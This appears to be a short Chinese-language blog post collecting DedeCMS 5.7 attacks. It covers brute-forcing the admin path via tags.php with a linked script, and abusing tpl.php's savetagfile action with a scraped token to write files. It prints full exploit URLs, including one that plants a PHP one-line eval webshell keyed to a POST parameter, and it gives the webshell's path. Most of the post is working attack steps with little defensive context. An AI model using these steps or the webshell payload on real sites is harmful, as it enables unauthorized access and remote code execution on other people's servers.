---
layout: post
title: dedecms漏洞合集
date: 2019-12-20
categories: blog
tags: [dedecms漏洞合集]
description: dedecms漏洞合集
---

#### dedecms 5.7后台地址爆破
1、前提条件，存在tags.php
![](https://qiya7.github.io/images/dedecms/1.png)
2、使用以下脚本爆破
`https://github.com/qiya7/daily-code/blob/master/dedecms/dedebackdoor.py`
3、爆破成功，爆破的原理大意就是通过访问图片是否存在会返回不同响应包来判断后台地址
![](https://qiya7.github.io/images/dedecms/2.png)

#### dedecms5.7 shell文件写入
1、admin登录状态下，访问`http://10.6.6.218/fksgi2ikxjfmw/tpl.php?action=upload`,右键查看源码获取token
![](https://qiya7.github.io/images/dedecms/3.png)

2、访问以下url生成phpinfo文件`10.6.6.218/fksgi2ikxjfmw/tpl.php?filename=shell.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=3e0023997cf2227e0f5a5f993e458a55`

3、访问`http://10.6.6.218/include/taglib/shell.lib.php`查看是否写入成功
![](https://qiya7.github.io/images/dedecms/4.png)

4、执行以下命令写入一句话木马
`http://10.6.6.218/fksgi2ikxjfmw/tpl.php?filename=test.lib.php&action=savetagfile&content=<?php @eval($_POST['pass']);?>&token=3e0023997cf2227e0f5a5f993e458a55`

5、木马地址为`http://10.6.6.218/include/taglib/test.lib.php`

6、注意：写入文件后缀被限制为.lib.php








